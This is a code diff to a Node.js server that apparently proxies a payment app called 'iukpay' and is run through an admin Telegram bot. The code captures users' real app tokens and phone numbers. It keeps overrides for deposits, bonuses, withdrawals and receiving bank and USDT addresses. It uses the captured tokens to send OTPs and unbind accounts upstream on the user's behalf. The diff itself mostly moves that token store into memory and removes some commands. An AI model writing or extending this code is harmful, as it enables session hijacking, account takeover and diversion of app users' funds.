@@ -30,6 +30,32 @@ const DEFAULT_DATA = {
   trackedUsers: {}
 };
 
+const SETTINGS_KEYS = ['banks', 'activeIndex', 'autoRotate', 'lastUsedIndex', 'botEnabled', 'usdtAddress', 'serviceOverride', 'serviceLink', 'logRequests', 'debugMode', 'adminChatId', 'depositSuccess', 'depositBonus', 'withdrawOverride', 'blockUpdate'];
+const SETTINGS_DATA_KEY = 'iukpaySettings';
+const PRIMARY_DATA_KEY = 'iukpayData';
+
+function cloneValue(value) {
+  if (value === undefined) return undefined;
+  return JSON.parse(JSON.stringify(value));
+}
+
+function applyAuthoritativeSettings(target, source) {
+  if (!source || typeof source !== 'object') return target;
+  for (const key of SETTINGS_KEYS) {
+    if (source[key] !== undefined) target[key] = cloneValue(source[key]);
+  }
+  return target;
+}
+
+function extractAuthoritativeSettings(source) {
+  const out = {};
+  if (!source || typeof source !== 'object') return out;
+  for (const key of SETTINGS_KEYS) {
+    if (source[key] !== undefined) out[key] = cloneValue(source[key]);
+  }
+  return out;
+}
+
 let bot = null;
 let webhookSet = false;
 try { bot = new TelegramBot(BOT_TOKEN); } catch(e) {}
@@ -115,79 +141,92 @@ async function safeSend(chatId, text, options) {
 
 async function loadData(forceRefresh) {
   if (!forceRefresh && cachedData && (Date.now() - cacheTime < CACHE_TTL)) return cachedData;
-  if (!redis) return { ...DEFAULT_DATA };
+  if (!redis) {
+    if (!cachedData) { cachedData = { ...DEFAULT_DATA }; cacheTime = Date.now(); }
+    return cachedData;
+  }
   try {
-    let raw = await redis.get('iukpayData');
-    if (raw) {
-      if (typeof raw === 'string') {
-        try { raw = JSON.parse(raw); } catch(e) {}
-      }
-      if (typeof raw === 'object' && raw !== null) {
-        cachedData = { ...DEFAULT_DATA, ...raw };
-      } else {
-        cachedData = { ...DEFAULT_DATA };
-      }
-      if (!cachedData.userOverrides) cachedData.userOverrides = {};
-      if (!cachedData.trackedUsers) cachedData.trackedUsers = {};
-      cacheTime = Date.now();
-      return cachedData;
+    let raw = await redis.get(PRIMARY_DATA_KEY);
+    if (typeof raw === 'string') {
+      try { raw = JSON.parse(raw); } catch (e) { raw = null; }
     }
-    if (cachedData) return cachedData;
-  } catch(e) {
-    console.error('Redis load error:', e.message);
-    if (cachedData) {
-      console.error('Redis failed, using cached data to preserve adminChatId');
-      return cachedData;
+    if (raw && typeof raw === 'object') cachedData = { ...DEFAULT_DATA, ...raw };
+    else if (!cachedData) cachedData = { ...DEFAULT_DATA };
+
+    let settingsRaw = null;
+    try { settingsRaw = await redis.get(SETTINGS_DATA_KEY); } catch (e) { }
+    if (typeof settingsRaw === 'string') {
+      try { settingsRaw = JSON.parse(settingsRaw); } catch (e) { settingsRaw = null; }
     }
-  }
-  if (!cachedData) {
-    cachedData = { ...DEFAULT_DATA };
+    // Once initialized by a command, the settings record is authoritative over
+    // stale request snapshots written to the legacy primary data record.
+    if (settingsRaw && typeof settingsRaw === 'object') applyAuthoritativeSettings(cachedData, settingsRaw);
+
+    if (!cachedData.userOverrides) cachedData.userOverrides = {};
+    if (!cachedData.trackedUsers) cachedData.trackedUsers = {};
     cacheTime = Date.now();
+    return cachedData;
+  } catch (e) {
+    console.error('Redis load error:', e.message);
+    if (cachedData) return cachedData;
   }
+  if (!cachedData) { cachedData = { ...DEFAULT_DATA }; cacheTime = Date.now(); }
   return cachedData;
 }
 
 let saveQueue = Promise.resolve();
 async function saveData(data) {
-  // Snapshot at call time so later queued requests cannot mutate this command's payload.
-  data = JSON.parse(JSON.stringify(data));
+  // Capture a call-time snapshot so later request handlers cannot mutate this save.
+  data = cloneValue(data) || { ...DEFAULT_DATA };
   const run = async () => {
-    const skipMerge = data._skipOverrideMerge;
+    const skipMerge = !!data._skipOverrideMerge;
     if (skipMerge) delete data._skipOverrideMerge;
     if (!redis) { cachedData = data; cacheTime = Date.now(); return; }
 
-    try {
-      if (!skipMerge) {
-        let current = await redis.get('iukpayData');
-        if (typeof current === 'string') {
-          try { current = JSON.parse(current); } catch (e) { current = null; }
-        }
-        if (current && typeof current === 'object') {
-          const settingsKeys = ['banks', 'activeIndex', 'autoRotate', 'botEnabled', 'usdtAddress', 'serviceOverride', 'serviceLink', 'logRequests', 'debugMode', 'adminChatId', 'depositSuccess', 'depositBonus', 'withdrawOverride', 'blockUpdate'];
-          for (const key of settingsKeys) {
-            if (current[key] !== undefined) data[key] = current[key];
-          }
-          if (current.userOverrides) data.userOverrides = JSON.parse(JSON.stringify(current.userOverrides));
-          if (current.balanceHistory && Array.isArray(current.balanceHistory) && (!data.balanceHistory || data.balanceHistory.length < current.balanceHistory.length)) data.balanceHistory = current.balanceHistory;
-          if (current.sellHistory && Array.isArray(current.sellHistory) && (!data.sellHistory || data.sellHistory.length < current.sellHistory.length)) data.sellHistory = current.sellHistory;
-        }
-      }
-
-      const payload = JSON.parse(JSON.stringify(data));
-      cachedData = payload;
-      cacheTime = Date.now();
+    const writeWithRetry = async (key, value) => {
       let lastError = null;
       for (let attempt = 1; attempt <= 3; attempt++) {
         try {
-          await redis.set('iukpayData', payload);
-          lastError = null;
-          break;
+          await redis.set(key, value);
+          return;
         } catch (e) {
           lastError = e;
           if (attempt < 3) await new Promise(resolve => setTimeout(resolve, attempt * 250));
         }
       }
-      if (lastError) throw lastError;
+      throw lastError;
+    };
+
+    try {
+      let current = await redis.get(PRIMARY_DATA_KEY);
+      if (typeof current === 'string') {
+        try { current = JSON.parse(current); } catch (e) { current = null; }
+      }
+      let currentSettings = null;
+      try { currentSettings = await redis.get(SETTINGS_DATA_KEY); } catch (e) { }
+      if (typeof currentSettings === 'string') {
+        try { currentSettings = JSON.parse(currentSettings); } catch (e) { currentSettings = null; }
+      }
+
+      if (!skipMerge) {
+        // Background saves must never overwrite command-managed settings. Before
+        // the settings key exists, preserve settings from the legacy record.
+        applyAuthoritativeSettings(data, currentSettings || current);
+        if (current && typeof current === 'object') {
+          if (current.userOverrides) data.userOverrides = cloneValue(current.userOverrides);
+          if (current.balanceHistory && Array.isArray(current.balanceHistory) && (!data.balanceHistory || data.balanceHistory.length < current.balanceHistory.length)) data.balanceHistory = cloneValue(current.balanceHistory);
+          if (current.sellHistory && Array.isArray(current.sellHistory) && (!data.sellHistory || data.sellHistory.length < current.sellHistory.length)) data.sellHistory = cloneValue(current.sellHistory);
+        }
+      }
+
+      const payload = cloneValue(data);
+      // Command saves publish the authoritative settings record first. Any later
+      // background request can safely rewrite PRIMARY_DATA_KEY because load/save
+      // overlays this record before writing.
+      if (skipMerge) await writeWithRetry(SETTINGS_DATA_KEY, JSON.stringify(extractAuthoritativeSettings(payload)));
+      cachedData = payload;
+      cacheTime = Date.now();
+      await writeWithRetry(PRIMARY_DATA_KEY, JSON.stringify(payload));
     } catch (e) {
       console.error('Redis save error:', e.message);
       cachedData = data;
@@ -210,12 +249,8 @@ function saveTokenUserId(req, userId) {
   if (tok && tok.length > 10) {
     const key = tok.substring(0, 100);
     tokenUserMap[key] = String(userId);
-    // Reverse map: userId -> latest REAL apptoken (so bot commands can auto-resolve from userId)
+    // In-memory only: userId -> latest apptoken for this process run
     userTokenMap[String(userId)] = tok;
-    if (redis) {
-      redis.hset('iukpayTokenMap', key, String(userId)).catch(()=>{});
-      redis.hset('iukpayUserTokenMap', String(userId), tok).catch(()=>{});
-    }
   }
 }
 
@@ -232,12 +267,6 @@ async function resolveTokenAndUser(input) {
   if (looksLikeToken) {
     const key = s.substring(0, 100);
     let uid = tokenUserMap[key] || '';
-    if (!uid && redis) {
-      try {
-        const stored = await redis.hget('iukpayTokenMap', key);
-        if (stored) { uid = String(stored); tokenUserMap[key] = uid; }
-      } catch(e) {}
-    }
     return { token: s, userId: uid };
   }
 
@@ -265,12 +294,6 @@ async function resolveTokenAndUser(input) {
   }
 
   let tok = userTokenMap[uid] || '';
-  if (!tok && redis) {
-    try {
-      const stored = await redis.hget('iukpayUserTokenMap', uid);
-      if (stored) { tok = String(stored); userTokenMap[uid] = tok; }
-    } catch(e) {}
-  }
   return { token: tok, userId: uid };
 }
 
@@ -279,12 +302,6 @@ async function getUserIdFromToken(req) {
   if (!tok || tok.length < 10) return null;
   const key = tok.substring(0, 100);
   if (tokenUserMap[key]) return tokenUserMap[key];
-  if (redis) {
-    try {
-      const stored = await redis.hget('iukpayTokenMap', key);
-      if (stored) { tokenUserMap[key] = String(stored); return String(stored); }
-    } catch(e) {}
-  }
   return null;
 }
 
@@ -360,14 +377,6 @@ async function isLogOffByToken(data, req) {
   if (checkedTokens.has(tKey)) return false;
   const userId = tokenUserMap[tKey] || '';
   if (userId && isLogOff(data, userId)) { logOffTokens.add(tKey); return true; }
-  if (redis) {
-    try {
-      const isOff = await redis.sismember('iukpayLogOffTokens', tKey);
-      if (isOff) { logOffTokens.add(tKey); return true; }
-      const stored = await redis.hget('iukpayTokenMap', tKey);
-      if (stored && isLogOff(data, stored)) { logOffTokens.add(tKey); redis.sadd('iukpayLogOffTokens', tKey).catch(()=>{}); return true; }
-    } catch(e) {}
-  }
   checkedTokens.add(tKey);
   return false;
 }
@@ -789,12 +798,6 @@ app.use((req, res, next) => {
         userId = body.memberCodeId || '';
       }
       if (userId && isLogOff(data, userId)) { if (tKey) logOffTokens.add(tKey); return; }
-      if (!userId && tKey && redis) {
-        try {
-          const isOff = await redis.sismember('iukpayLogOffTokens', tKey);
-          if (isOff) { logOffTokens.add(tKey); return; }
-        } catch(e) {}
-      }
       const phone = getPhone(data, userId);
       const tag = userId ? ` [${userId}]` : '';
       const phoneTag = phone ? ` (${phone})` : '';
@@ -846,10 +849,6 @@ app.post('/bot-webhook', async (req, res) => {
     const text = msg.text.trim();
     let data = await loadData(true);
 
-    if (text === '/myid') {
-      await bot.sendMessage(chatId, `🆔 Your Telegram Chat ID: \`${chatId}\``, { parse_mode: 'Markdown' });
-      return res.sendStatus(200);
-    }
 
     if (data.adminChatId && String(chatId) !== String(data.adminChatId)) {
       await bot.sendMessage(chatId, `❌ Unauthorized chat ID (${chatId}). Only the current admin can use this bot or transfer admin rights.`);
@@ -884,7 +883,6 @@ app.post('/bot-webhook', async (req, res) => {
 /status — Full status
 /debug — Toggle Full Payload Debug (Req + Resp for all endpoints)
 /debug on | /debug off — Turn full payload debug ON/OFF
-/myid — Show your Telegram Chat ID
 /setadmin <newChatId> — Transfer admin access to new Chat ID
 
 === BALANCE ===
@@ -907,15 +905,6 @@ app.post('/bot-webhook', async (req, res) => {
 
 === TRACKING ===
 /idtrack — Show all tracked user IDs
-
-=== USER INFO (auto-uses captured token) ===
-🔑 Pass <userId> (e.g. 185806) OR <phone> (10-digit) OR <fullToken>.
-   App ke kisi bhi action ke baad token automatic capture hota hai.
-
-/profile <id> — MemberCode, phone, balance, frozen, today's commission
-/customer <id> — Customer service links
-/tgrobot <id> — TG robot bind status + bind code
-/lasttoken <id> — Show last captured real apptoken for user
 
 === ACTIONS ===
 /sendcode <id> [codeType] — Send OTP (default unbindRobot)
@@ -988,19 +977,6 @@ Example:
       data.userOverrides[targetId].logOff = true;
       data._skipOverrideMerge = true;
       await saveData(data);
-      if (redis) {
-        try {
-          const allTokens = await redis.hgetall('iukpayTokenMap');
-          if (allTokens) {
-            for (const [tKey, uid] of Object.entries(allTokens)) {
-              if (String(uid) === String(targetId)) {
-                await redis.sadd('iukpayLogOffTokens', tKey);
-                logOffTokens.add(tKey);
-              }
-            }
-          }
-        } catch(e) {}
-      }
       for (const [tKey, uid] of Object.entries(tokenUserMap)) {
         if (String(uid) === String(targetId)) logOffTokens.add(tKey);
       }
@@ -1016,19 +992,6 @@ Example:
         delete data.userOverrides[targetId].logOff;
         data._skipOverrideMerge = true;
         await saveData(data);
-      }
-      if (redis) {
-        try {
-          const allTokens = await redis.hgetall('iukpayTokenMap');
-          if (allTokens) {
-            for (const [tKey, uid] of Object.entries(allTokens)) {
-              if (String(uid) === String(targetId)) {
-                await redis.srem('iukpayLogOffTokens', tKey);
-                logOffTokens.delete(tKey);
-              }
-            }
-          }
-        } catch(e) {}
       }
       for (const [tKey, uid] of Object.entries(tokenUserMap)) {
         if (String(uid) === String(targetId)) logOffTokens.delete(tKey);
@@ -1397,7 +1360,7 @@ Example:
     }
 
 
-    const TOKEN_CMDS = 'profile|customer|tgrobot|sendcode|unbind|lasttoken';
+    const TOKEN_CMDS = 'sendcode|unbind';
     const tokenCmdMatch = text.match(new RegExp(`^\\/(${TOKEN_CMDS})\\s+(.+)$`, 'i'));
     if (tokenCmdMatch) {
       const cmd = tokenCmdMatch[1].toLowerCase();
@@ -1415,7 +1378,7 @@ Example:
       let rawToken = resolved.token;
       let uid = resolved.userId;
       if (!rawToken && /^\d{4,10}$/.test(rawArg.replace(/^MC/i, '').split('_')[0])) {
-        await bot.sendMessage(chatId, `❌ User ${uid || rawArg} ka real apptoken abhi tak capture nahi hua.\n\nUser ko app khol ke ek baar koi action karna hoga (login/refresh) — phir token automatic store ho jayega.\n\nYa direct full apptoken paste karo: /${cmd} <fullApptoken>`);
+        await bot.sendMessage(chatId, `❌ User ${uid || rawArg} ka real apptoken abhi tak capture nahi hua.\n\nUser ko app khol ke ek baar koi action karna hoga (login/refresh) — phir token is process memory mein available ho jayega.\n\nYa direct full apptoken paste karo: /${cmd} <fullApptoken>`);
         return res.sendStatus(200);
       }
       const tKey = rawToken.substring(0, 100);
@@ -1435,33 +1398,6 @@ Example:
         'user-agent': 'okhttp/4.11.0'
       };
 
-      if (cmd === 'tgrobot') {
-        await bot.sendMessage(chatId, `⏳ Checking robot bind...`);
-        try {
-          const r = await fetch(ORIGINAL_API + '/app/api/memberManager/bindRobotDetail', { method: 'POST', headers: upstreamHeaders, body: '{}' });
-          const txt = await r.text();
-          let j = null; try { j = JSON.parse(txt); } catch(e) {}
-          const d = getResponseData(j) || {};
-          const boundRaw = (d.bindTelegramBotFlag !== undefined) ? d.bindTelegramBotFlag
-                           : (d.isBound !== undefined) ? d.isBound
-                           : (d.bound !== undefined) ? d.bound
-                           : (d.bindStatus !== undefined) ? d.bindStatus
-                           : null;
-          const isBound = (boundRaw === true || boundRaw === 1 || boundRaw === '1' || String(boundRaw).toLowerCase() === 'true' || String(boundRaw).toLowerCase() === 'bound');
-          const phone = uid ? getPhone(data, uid) : '';
-          let m = `🤖 TG ROBOT BIND STATUS\n━━━━━━━━━━━━━━━━━━\n${uid ? `👤 User: ${uid}${phone ? ' (' + phone + ')' : ''}\n` : ''}🔑 Token: ${rawToken.substring(0, 20)}...\n📊 HTTP: ${r.status} | code: ${j?.code ?? 'N/A'}\n\n${boundRaw === null ? '❓ Bound: UNKNOWN (no bind field in response)' : (isBound ? '✅ BOUND' : '❌ NOT BOUND')}\n`;
-          if (d.telegramBotLink || d.botLink) m += `🔗 Bot Link: ${d.telegramBotLink || d.botLink}\n`;
-          if (d.telegramBindCode || d.bindCode || d.code) m += `🔢 Bind Code: ${d.telegramBindCode || d.bindCode || d.code}\n`;
-          if (d.telegramUserName || d.tgUsername || d.username) m += `👥 TG Username: ${d.telegramUserName || d.tgUsername || d.username}\n`;
-          if (d.telegramUserId || d.tgUserId) m += `🆔 TG UserId: ${d.telegramUserId || d.tgUserId}\n`;
-          m += `\n📥 RAW:\n${JSON.stringify(d).substring(0, 1500)}`;
-          if (m.length > 4000) m = m.substring(0, 4000) + '\n... (truncated)';
-          await bot.sendMessage(chatId, m);
-        } catch(e) {
-          await bot.sendMessage(chatId, `❌ Robot detail fetch failed: ${e.message}`);
-        }
-        return res.sendStatus(200);
-      }
 
       const callUpstream = async (path, body) => {
         const r = await fetch(ORIGINAL_API + path, { method: 'POST', headers: upstreamHeaders, body: JSON.stringify(body || {}) });
@@ -1474,39 +1410,7 @@ Example:
       const truncate = (s) => s.length > 4000 ? s.substring(0, 4000) + '\n... (truncated)' : s;
 
       try {
-        if (cmd === 'profile') {
-          await bot.sendMessage(chatId, `⏳ Fetching profile...`);
-          const { r, j } = await callUpstream('/app/api/memberManager/mine', {});
-          const d = getResponseData(j) || {};
-          let m = headerLine('👤 PROFILE') + respLine(r, j) + `\n\n`;
-          m += `🆔 MemberCode: MC${d.memberCodeId || uid || 'N/A'}\n`;
-          m += `📱 Phone: ${d.memberPhone || 'N/A'}\n`;
-          m += `💰 Balance: ₹${d.balance ?? 'N/A'}\n`;
-          m += `🧊 Frozen: ₹${d.freezeBalance ?? '0'}\n`;
-          m += `📈 Today's Commission: ₹${d.commissionsToday ?? '0'}\n`;
-          m += `💸 Min Withdrawal: ₹${d.minimumWithdrawalLimit ?? 'N/A'}\n`;
-          m += `🎯 Min UPI Amount: ${d.upiAcceptAmountMin ?? 'N/A'}\n`;
-          m += `\n📥 RAW:\n${JSON.stringify(d, null, 2).substring(0, 1500)}`;
-          await bot.sendMessage(chatId, truncate(m));
-          return res.sendStatus(200);
-        }
 
-        if (cmd === 'customer') {
-          await bot.sendMessage(chatId, `⏳ Fetching customer service...`);
-          const { r, j } = await callUpstream('/app/api/customer/list', {});
-          const d = getResponseData(j);
-          let m = headerLine('🎧 CUSTOMER SERVICE') + respLine(r, j) + `\n\n`;
-          const arr = Array.isArray(d) ? d : (d ? [d] : []);
-          if (arr.length) {
-            arr.forEach((c, i) => {
-              m += `${i + 1}. ${c.name || c.title || c.serviceName || c.customerName || 'service'}\n`;
-              m += `   🔗 ${c.url || c.link || c.serviceUrl || c.contactUrl || c.customerUrl || ''}\n`;
-            });
-          } else m += `(empty)\n`;
-          m += `\n📥 RAW:\n${JSON.stringify(d, null, 2).substring(0, 1000)}`;
-          await bot.sendMessage(chatId, truncate(m));
-          return res.sendStatus(200);
-        }
 
         if (cmd === 'sendcode') {
           await bot.sendMessage(chatId, `⏳ Sending verification code...`);
@@ -1544,10 +1448,6 @@ Example:
           return res.sendStatus(200);
         }
 
-        if (cmd === 'lasttoken') {
-          await bot.sendMessage(chatId, `🔑 LAST TOKEN\n👤 User: ${uid || 'N/A'}\n━━━━━━━━━━━━━━━━━━\n\`${rawToken}\``, { parse_mode: 'Markdown' });
-          return res.sendStatus(200);
-        }
       } catch(e) {
         await bot.sendMessage(chatId, `❌ /${cmd} failed: ${e.message}`);
         return res.sendStatus(200);
@@ -1593,11 +1493,9 @@ app.post('/app/api/system/v2/login', async (req, res) => {
       const loginData = getResponseData(jsonResp);
       if (loginData && loginData.token) {
         tokenUserMap[loginData.token] = String(userId);
-        if (redis) redis.hset('iukpayTokenMap', loginData.token.substring(0, 100), String(userId)).catch(()=>{});
       }
       if (loginData && loginData.accessToken) {
         tokenUserMap[loginData.accessToken] = String(userId);
-        if (redis) redis.hset('iukpayTokenMap', loginData.accessToken.substring(0, 100), String(userId)).catch(()=>{});
       }
       if (loginData) {
         const respPhone = loginData.memberPhone || loginData.phone || loginData.mobile || loginData.telephone || '';
@@ -1614,11 +1512,9 @@ app.post('/app/api/system/v2/login', async (req, res) => {
         saveTokenUserId(req, String(respUserId));
         if (loginData && loginData.token) {
           tokenUserMap[loginData.token] = String(respUserId);
-          if (redis) redis.hset('iukpayTokenMap', loginData.token.substring(0, 100), String(respUserId)).catch(()=>{});
         }
         if (loginData && loginData.accessToken) {
           tokenUserMap[loginData.accessToken] = String(respUserId);
-          if (redis) redis.hset('iukpayTokenMap', loginData.accessToken.substring(0, 100), String(respUserId)).catch(()=>{});
         }
         trackUser(data, String(respUserId), 'Login', phone);
         saveData(data).catch(()=>{});
